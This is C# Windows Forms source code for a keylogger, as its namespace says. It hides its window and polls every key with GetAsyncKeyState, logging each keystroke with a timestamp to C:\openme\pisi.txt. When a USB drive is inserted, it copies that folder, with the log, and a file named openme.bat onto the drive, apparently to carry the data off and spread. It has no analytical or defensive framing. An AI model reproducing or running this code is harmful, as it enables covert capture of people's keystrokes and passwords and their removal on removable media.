using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace keylogger
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll")]
      public static extern int GetAsyncKeyState(Int32 i);
        string s = "";
       private const int devicechanged = 0X219;
        private const int devicearrival = 0X8000;
        private const int devicecomplete = 0X8004;
        private const int devicetype= 0X00000002;
    
      
        protected override void WndProc(ref Message m)
        {

            if (m.Msg == devicechanged)
            {
                DEV_BROADCAST_VOLUME vol = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                if ((m.WParam.ToInt32() == devicearrival) && (vol.dbcv_devicetype == devicetype))
                {
                    bool puzo = false;

                    DriveInfo[] myDrives = DriveInfo.GetDrives();

                    foreach (DriveInfo drive in myDrives)
                    {
                       

                        if (drive.IsReady == true && drive.VolumeLabel=="puzo")
                        {
                            puzo = true;
                           
                        }
                    }
                    if (puzo == false)
                    {
                        string sourcePath = @"C:\openme";
                        string targetPath = DriveMaskToLetter(vol.dbcv_unitmask).ToString() + @":\openme";
                        if (!Directory.Exists(targetPath))
                        {
                            Directory.CreateDirectory(targetPath);
                            foreach (var srcPath in Directory.GetFiles(sourcePath))
                            {
                                File.Copy(srcPath, srcPath.Replace(sourcePath, targetPath), true);
                            }
                            StreamWriter sr = new StreamWriter(DriveMaskToLetter(vol.dbcv_unitmask).ToString() + @":\openme\pisi.txt");
                            sr.WriteLine("");
                            sr.Close();
                            File.Copy(@"C:\openme\openme.bat", DriveMaskToLetter(vol.dbcv_unitmask).ToString() + @":\openme.bat");
                        }
                    }
                    else
                    {
                        MessageBox.Show("ovo je puzo");
                    }
                  
                  
                }
           /*     if ((m.WParam.ToInt32() == devicecomplete) && (vol.dbcv_devicetype == devicetype))
                {
                    MessageBox.Show("usb out");
                }*/
            }
            base.WndProc(ref m);
        }

        [StructLayout(LayoutKind.Sequential)] //Same layout in mem
        public struct DEV_BROADCAST_VOLUME
        {
            public int dbcv_size;
            public int dbcv_devicetype;
            public int dbcv_reserved;
            public int dbcv_unitmask;
        }

        private static char DriveMaskToLetter(int mask)
        {
            char letter;
            string drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            int cnt = 0;
            int pom = mask / 2;
            while (pom != 0)       
            {
                pom = pom / 2;
                cnt++;
            }
            if (cnt < drives.Length)
                letter = drives[cnt];
            else
                letter = '?';
            return letter;
        }
     
        public Form1()
        {
          
            InitializeComponent();
        
         
          
          
            
          
            
      
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            this.Hide();
          
           
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
           
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {
           
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 1 || keyState == -32767)
                {
                 
                    if (s.Contains("S|T|O|P|") == false || s.Contains("C|O|N|T|I|N|U|E|"))
                    {
                        if (s.Contains("E|X|I|T|"))
                        {
                            Application.Exit();
                        }
                        else
                        {

                            StreamWriter sr = new StreamWriter(@"C:\openme\pisi.txt", true);
                            sr.WriteLine((ConsoleKey)i + "-" + DateTime.Now);
                            sr.Close();
                        }

                    }
                    if (s.Contains("C|O|N|T|I|N|U|E|"))
                    {
                        s = "";
                    }
                 
                    s += (ConsoleKey)i + "|";
                    break;
                }
            }
        }
    }





}
